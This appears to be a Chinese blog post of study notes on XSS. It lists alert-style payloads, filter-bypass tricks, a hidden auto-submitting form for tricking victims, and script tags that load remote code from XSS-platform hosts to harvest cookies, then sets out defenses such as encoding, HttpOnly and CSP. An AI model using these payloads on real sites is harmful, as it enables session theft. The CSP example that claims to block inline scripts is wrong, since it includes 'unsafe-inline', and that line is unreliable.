---
title: "XSS 跨站脚本"
published: 2026-09-14T22:46:00+08:00
description: "XSS 的分类、常见 payload、打点与绕过方式，以及输出编码等防御手段。"
image: ""
tags:
  - 安全笔记
  - Web安全
category: 技术文章
draft: false
lang: zh-CN
pinned: false
comment: true
---

## 一、XSS 概述

### 1.1 什么是 XSS？

**XSS**（Cross Site Scripting，**跨站脚本攻击**）是一种前端漏洞，目的是让受害者的浏览器执行攻击者编写的**恶意 JS 脚本**。

| 属性     | 说明                                         |
| -------- | -------------------------------------------- |
| 攻击目标 | 前端脚本解析引擎（如浏览器 JavaScript 引擎） |
| 攻击架构 | B/S 架构（Browser ↔ Server）                 |
| 核心目的 | 让受害者 JS 客户端运行攻击者的恶意脚本       |

### 1.2 XSS 的危害

**技术层面：**

+ 窃取凭证（Cookie、Session）
+ 篡改 DOM（页面布局及内容）
+ 嵌入恶意脚本代码
+ 发起恶意请求（Ajax）
+ 键盘记录
+ 窃取用户浏览历史
+ 获取客户端 IP
+ 端口扫描
+ 获取剪贴板记录
+ 破解 CSRF Token 限制

**社会影响层面：**

+ 无账号密码情况下非法登录网站
+ 网络钓鱼
+ 网页蠕虫
+ 网页篡改

### 1.3 XSS 漏洞原理

> **前端用户提交的脚本代码，被其他用户浏览器执行，产生预期外的执行后果。**

简单来说：**让自己提交的前端脚本代码被别人运行。**

---

## 二、JS 执行模板

| Payload                                          | 说明                   |
| ------------------------------------------------ | ---------------------- |
| `<script>alert(1)</script>`                      | 直接嵌入 script 标签   |
| `<script src=https://xsspt.com/MQzN0Z></script>` | 从远程加载 script      |
| `<input onmouseover="alert(1)">`                 | 通过事件属性触发       |
| `<a href="javascript:alert(1)">aaa</a>`          | 超链接伪协议           |
| `<svg onload="alert(1)">`                        | SVG 标签的 onload 事件 |
| `<svg><script>alert(1)</script></svg>`           | SVG 中嵌入 script      |
| `<textarea></textarea><script>alert(1)</script>` | 闭合 textarea 后注入   |

**闭合技巧：**

```html
<!-- 需要先闭合标签再注入 -->
<textarea>xxx</textarea>  →  <textarea></textarea><script>alert(1)</script>

```

---

## 三、XSS 类型

| 类型           | 说明                                          | 是否与服务器交互 |
| -------------- | --------------------------------------------- | ---------------- |
| **反射型 XSS** | 一次性 XSS，通过 URL 参数传递恶意代码         | ✅ 是             |
| **存储型 XSS** | 持久性 XSS，恶意代码存储在服务器数据库中      | ✅ 是             |
| **DOM 型 XSS** | 一次性 XSS，通过 DOM 操作触发，不与服务器交互 | ❌ 否             |

### 3.1 反射型 XSS

```plain
攻击者 → 构造恶意链接 → 诱骗受害者点击 → 恶意脚本在受害者浏览器执行
```

**示例：**

```plain
http://target.com/search?q=<script>alert(1)</script>

```

### 3.2 存储型 XSS

```plain
攻击者 → 在论坛/评论区提交恶意脚本 → 存储在服务器数据库 → 其他用户访问页面时执行
```

### 3.3 DOM 型 XSS

```plain
攻击者 → 构造恶意 URL → 页面 JS 解析 URL 参数 → 动态写入 DOM → 脚本执行
```

**特点：** 不与服务器交互，完全在客户端发生。

---

## 四、如何发现 XSS

**核心原则：见框就插！**

### 常见输入点

| 输入点      | 说明                        |
| ----------- | --------------------------- |
| URL 参数    | `?q=xxx`、`?id=xxx`         |
| 无参 URL    | `/name/zs` 路径部分         |
| 表单输入    | 搜索框、评论区、注册/登录框 |
| 文件上传点  | 文件名、文件内容            |
| HTTP 请求头 | User-Agent、Referer、Cookie |

### 发现思路

1. 找到输入点和输出点
2. 根据输入点猜测后台的输出点位置及触发条件（盲 XSS）
3. 使用 Payload 测试
4. 观察闭合、过滤和拦截情况
5. 重新构造 Payload

---

## 五、XSS 代码投放方式

### 方式1：直接发送链接

```plain
http://target.com/search?q=<script>alert(1)</script>

```

### 方式2：通过短网址

```plain
原链接：http://target.com/search?q=<script>alert(1)</script>
短网址：http://dwz.cn/abc123
```

### 方式3：隐藏表单自动提交

```html
<!-- 诱骗用户点击的页面 -->
<img src="https://example.com/beautiful.jpg" />

<form action="http://target.com/alert.php" method="post">
    <input name="data" id="data" type="hidden" value="<script>alert(1)</script>">
    <input type="submit" id="btn" value="点击查看更多美女图片">
</form>
<script>
    document.getElementById('btn').click();
</script>

```

### 方式4：XSS 平台

从 XSS 平台（如 [https://xssaq.com）获取攻击](https://xssaq.com）获取攻击) JS 脚本，投放后收割 Cookie。

---

## 六、XSS 利用步骤

```plain
1. 找到输入点和输出点（含两者共存的情况）
2. 构造 Payload，尽量一次性成功
3. 观察闭合、过滤和拦截情况
4. 重新构造 Payload
5. 如不成功，重复第 3、4 步
```

---

## 七、编码和转义

### 编码

编码是**改变字符的外观表示**，中间件会自动解码还原。

| 编码类型      | 示例                             |
| ------------- | -------------------------------- |
| URL 编码      | `%3Cscript%3E`                   |
| HTML 实体编码 | `&lt;script&gt;`                 |
| Base64        | `PHNjcmlwdD4=`                   |
| Unicode       | `\u0061\u006c\u0065\u0072\u0074` |

### 转义

转义是**使特殊字符失去闭合等意义，成为普通字符**。

```php
// 转义单引号
' --> \'
```

| 对比             | 编码   | 转义 |
| ---------------- | ------ | ---- |
| 是否改变外观     | ✅ 是   | ❌ 否 |
| 是否失去特殊意义 | 视情况 | ✅ 是 |

### Unicode 编码示例

```javascript
// 三个八进制数字
"e" → "\145"

// 两个十六进制数字
"e" → "\x65"

// 四个十六进制数字
"e" → "\u0065"

// 示例：编码后的 alert(1)
eval("\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029");
```

---

## 八、XSS 绕过技巧

### 8.1 大小写绕过

```html
<ScRiPt>alert(1)</ScRiPt>

```

### 8.2 双写绕过

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
```

### 8.3 换行绕过

```html
<script>
alert(1)
</script>

```

### 8.4 引号和括号替代

```html
<!-- 使用 / 替代引号 -->
<script>alert(/XSS/)</script>
<!-- 使用 String.fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>

```

### 8.5 生僻元素绕过

```html
<svg onload="alert(1)">
<details open ontoggle="alert(1)">
```

### 8.6 注释绕过

```html
<!-- 使用注释闭合 -->
<script>alert(1)//</script>
<!-- 或 -->
<!-- --><script>alert(1)</script>

```

### 8.7 HTML 实体编码绕过

```html
<!-- HTML 实体编码绕过过滤 -->
<a href="javascript:alert(1)">点击</a>
<!-- 或 -->
<a href="javasc& #114;ipt:alert(1)">点击</a>

```

### 8.8 拉丁字母/特殊字符绕过

```html
<!-- 使用拉丁字母替代 -->
<ѕcript>alert(1)</ѕcript>

```

### 8.9 提前嵌入反斜杠

```html
<scr\ipt>alert(1)</scr\ipt>

```

### 8.10 多行代码合并

```html
<!-- 原始代码 -->
<script>
function add(x, y){
    return x+y;
}
document.write(add(2,3));
</script>
<!-- 合并为一行 -->
<script>function add(x,y){return x+y;}document.write(add(2,3));</script>

```

---

## 九、浏览器安全策略

### 9.1 同源策略

**判断同源的三个要素：**

| 要素     | 说明                                              |
| -------- | ------------------------------------------------- |
| **协议** | http / https                                      |
| **域名** | baidu.com / [www.baidu.com](http://www.baidu.com) |
| **端口** | 80 / 443 / 9001                                   |

**示例判断：**

```plain
http://baidu.com/              ← 基准
http://www.baidu.com           ❌ 域名不同
http://baidu.com:9001          ❌ 端口不同
https://baidu.com              ❌ 协议不同
http://baidu.com/abc/          ✅ 同源（路径不影响）
http://baidu.com/lab/          ✅ 同源（路径不影响）
```

### 9.2 跨域限制

**受跨域限制：**

| 限制项                        | 说明             |
| ----------------------------- | ---------------- |
| Cookie、LocalStorage、IndexDB | 无法跨域读取     |
| 修改 iframe 中其他网站的 DOM  | 无法跨域修改     |
| AJAX 请求                     | 默认无法跨域发起 |

**不受跨域限制：**

| 操作         | 说明                                      |
| ------------ | ----------------------------------------- |
| 跨域提交表单 | `<form action="...">`                     |
| 跨域引入资源 | `<img>`、`<iframe>`、`<link>`、`<script>` |

### 9.3 HttpOnly

| 属性         | 说明                                                         |
| ------------ | ------------------------------------------------------------ |
| **HttpOnly** | Cookie 标记 HttpOnly 后，**JS 无法读取该 Cookie**，只能由浏览器在 HTTP 请求中自动携带 |
| 作用         | 防止 XSS 窃取 Cookie（但无法防止 CSRF）                      |

```php
// PHP 设置 HttpOnly Cookie
setcookie("name", "value", time()+3600, "/", "", false, true);
//                                                                   ↑
//                                                              HttpOnly
```

### 9.4 常见疑问

**问：** XSS 代码植入后，将 Cookie 发送到 XSS 平台（不同源网站），为什么能成功？

**答：**

+ XSS 平台接收 Cookie 是通过 **跨域请求**（如 `<img src="xss平台地址?cookie=xxx">`）
+ 这种跨域请求**不受同源策略限制**（通过 `<img>`、`<script>` 等标签引入资源是允许的）
+ Cookie 的发送是通过**当前页面**的 JS 读取后拼接到 URL 中，不是浏览器自动携带 Cookie 跨域

---

## 十、XSS 防护思路

### 10.1 防护措施

| 措施              | 说明                                            |
| ----------------- | ----------------------------------------------- |
| **白名单策略**    | 只允许指定的标签和事件属性                      |
| **黑名单策略**    | 过滤危险标签和事件（不可靠，易绕过）            |
| **HTML 实体编码** | 对 `<`、`>`、`"`、`'`、`/` 进行编码             |
| **HttpOnly**      | 下发 Cookie 时添加 HttpOnly 属性                |
| **CSP**           | 设置 Content-Security-Policy，限制脚本执行来源  |
| **XSS 过滤框架**  | 使用成熟的防 XSS 框架（如 OWASP 的 ESAPI）      |
| **富文本编辑器**  | 采用成熟的富文本前端组件（如 UEditor、TinyMCE） |

### 10.2 关键防护代码

```php
// PHP 输出时进行 HTML 实体编码
echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8');

// PHP 设置 HttpOnly Cookie
setcookie('session_id', $value, [
    'httponly' => true,
    'secure' => true,   // 仅 HTTPS 传输
    'samesite' => 'Strict'
]);
```

### 10.3 CSP 示例

```html
<!-- 仅允许来自同源的脚本 -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self'">

<!-- 仅允许来自特定域名的脚本 -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self' https://cdn.example.com">

<!-- 禁止内联脚本执行 -->
<meta http-equiv="Content-Security-Policy" content="script-src 'self' 'unsafe-inline'">
```

---

## 📌 快速参考卡片

### 常用 Payload

```html
<!-- 基础弹窗 -->
<script>alert(1)</script>
<script>alert(document.cookie)</script>
<!-- 事件触发 -->
<img src="x" onerror="alert(1)">
<body onload="alert(1)">
<input onfocus="alert(1)" autofocus>

<!-- 超链接 -->
<a href="javascript:alert(1)">点击</a>
<!-- SVG -->
<svg onload="alert(1)">

<!-- 远程加载 -->
<script src="https://xss.pt/xxx.js"></script>

```

### XSS 类型判断

```plain
反射型：恶意代码在 URL 中，一次性
存储型：恶意代码在数据库中，持久性
DOM型：恶意代码在 URL 中，纯前端触发，不与服务器交互
```

### 绕过速查

```plain
大小写    → <ScRiPt>alert(1)</ScRiPt>
双写      → <scr<script>ipt>alert(1)</scr</script>ipt>
编码      → 实体编码、Unicode、Base64
生僻元素  → svg、details、video、audio
注释      → 用 // 或 <!-- --> 闭合
```

### 防御速查

```plain
输入过滤  → 过滤危险标签和事件
输出编码  → htmlspecialchars()
Cookie    → HttpOnly + Secure + SameSite
CSP       → 限制脚本来源
富文本    → 使用成熟编辑器
```
